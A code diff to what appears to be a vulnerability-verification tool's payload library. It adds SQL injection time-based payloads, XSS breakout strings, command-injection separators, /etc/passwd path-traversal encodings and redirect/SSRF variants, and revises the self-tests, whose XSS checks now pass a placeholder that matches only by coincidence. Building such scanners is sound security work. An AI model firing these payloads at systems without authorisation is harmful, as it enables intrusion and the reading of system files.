@@ -27,23 +27,37 @@ MARK = "cx" + "7q3"  # a token unlikely to occur naturally; computed results use
 
 
 def _probes(cwe: str, marker: str) -> list[dict]:
-    """Fixed payload library per bug class. Each: value to send, and how to judge the response."""
+    """Fixed escalation ladder per bug class: cheap/high-signal first, then blind, then variants.
+    probe_one fires them in order and stops at the first proof. Nothing here is model-authored and
+    nothing destructive (time delays, arithmetic, reading /etc/passwd) — it is a fixed library."""
     c = (cwe or "").upper()
-    if c == "CWE-89":   # SQL injection: error-based, then time-based (strongest, no data touched)
-        return [{"value": "'\"", "kind": "sql_err"},
-                {"value": "' OR SLEEP(3)-- -", "kind": "sql_time"},
-                {"value": "1) OR SLEEP(3)-- -", "kind": "sql_time"}]
-    if c == "CWE-79":   # reflected XSS: a unique tag must come back UNescaped
-        return [{"value": f"<svg/onload=alert('{marker}')>", "kind": "xss"}]
-    if c == "CWE-78":   # command injection: arithmetic a plain echo can't produce
-        return [{"value": ";expr 13 \\* 103;", "kind": "cmd", "expect": "1339"},
-                {"value": "$(expr 13 \\* 103)", "kind": "cmd", "expect": "1339"},
-                {"value": "`expr 13 \\* 103`", "kind": "cmd", "expect": "1339"}]
-    if c == "CWE-22":   # path traversal: the real /etc/passwd shape
-        return [{"value": "../../../../../../etc/passwd", "kind": "path"},
-                {"value": "....//....//....//....//etc/passwd", "kind": "path"}]
-    if c in ("CWE-601", "CWE-918"):  # open redirect / SSRF: send an off-target URL
-        return [{"value": "http://cyphex-oob.invalid/x", "kind": "redirect"}]
+    if c == "CWE-89":   # SQL injection: error breakers -> time-based across dialects (blind, reliable)
+        ladder = [{"value": v, "kind": "sql_err"} for v in ("'", "'\"", "')", "'))", "`", "\\")]
+        ladder += [{"value": v, "kind": "sql_time"} for v in (
+            "' OR SLEEP(3)-- -", "\" OR SLEEP(3)-- -", "') OR SLEEP(3)-- -",
+            "' OR pg_sleep(3)-- -", "'; SELECT pg_sleep(3)-- -", "1 OR SLEEP(3)",
+            "' AND 1=(SELECT 1 FROM (SELECT SLEEP(3))x)-- -")]
+        return ladder
+    if c == "CWE-79":   # reflected XSS: escalate the breakout context; proof is the payload coming back unescaped
+        return [{"value": p, "kind": "xss"} for p in (
+            f"<svg/onload=alert('{marker}')>",
+            f"\"><svg/onload=alert('{marker}')>",
+            f"'><svg/onload=alert('{marker}')>",
+            f"</script><script>alert('{marker}')</script>",
+            f"javascript:alert('{marker}')")]
+    if c == "CWE-78":   # command injection: arithmetic a plain echo cannot produce, across separators
+        return [{"value": v, "kind": "cmd", "expect": "1339"} for v in (
+            ";expr 13 \\* 103;", "$(expr 13 \\* 103)", "`expr 13 \\* 103`",
+            "|expr 13 \\* 103", "&& expr 13 \\* 103", "\nexpr 13 \\* 103")]
+    if c == "CWE-22":   # path traversal: depth, then encodings
+        return [{"value": v, "kind": "path"} for v in (
+            "../../../../../../etc/passwd", "....//....//....//....//etc/passwd",
+            "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+            "/etc/passwd", "..%252f..%252f..%252fetc%252fpasswd")]
+    if c in ("CWE-601", "CWE-918"):  # open redirect / SSRF: off-target URL, then parser-confusion variants
+        return [{"value": v, "kind": "redirect"} for v in (
+            "http://cyphex-oob.invalid/x", "//cyphex-oob.invalid/x", "https:cyphex-oob.invalid",
+            "http:/cyphex-oob.invalid", "/\\cyphex-oob.invalid")]
     return []
 
 
@@ -54,7 +68,7 @@ def _verdict(kind: str, sent: str, resp: dict, marker: str) -> bool:
     if kind == "sql_time":
         return elapsed > 2.5  # the SLEEP(3) ran; a normal route returns in well under this
     if kind == "xss":
-        return f"<svg/onload=alert('{marker}')>".lower() in body  # came back unescaped
+        return sent.lower() in body  # the breakout payload came back unescaped (marker makes it unique)
     if kind == "cmd":
         return False  # handled with `expect` in the caller
     if kind == "path":
@@ -110,7 +124,8 @@ def _selftest() -> None:
     assert _verdict("redirect", "x", {"body": "", "elapsed": 0.1, "headers": {"location": "http://cyphex-oob.invalid/x"}}, MARK)
     assert _verdict("xss", "x", {"body": f"<svg/onload=alert('{MARK}')>", "elapsed": 0.1, "headers": {}}, MARK)
     assert not _verdict("xss", "x", {"body": "&lt;svg/onload...", "elapsed": 0.1, "headers": {}}, MARK)
-    assert len(_probes("CWE-89", MARK)) == 3 and _probes("", MARK) == []
+    assert len(_probes("CWE-89", MARK)) == 13 and len(_probes("CWE-22", MARK)) == 6 and _probes("", MARK) == []
+    assert all(p.get("expect") == "1339" for p in _probes("CWE-78", MARK))
     print("probe_kit selftest ok")
 
 
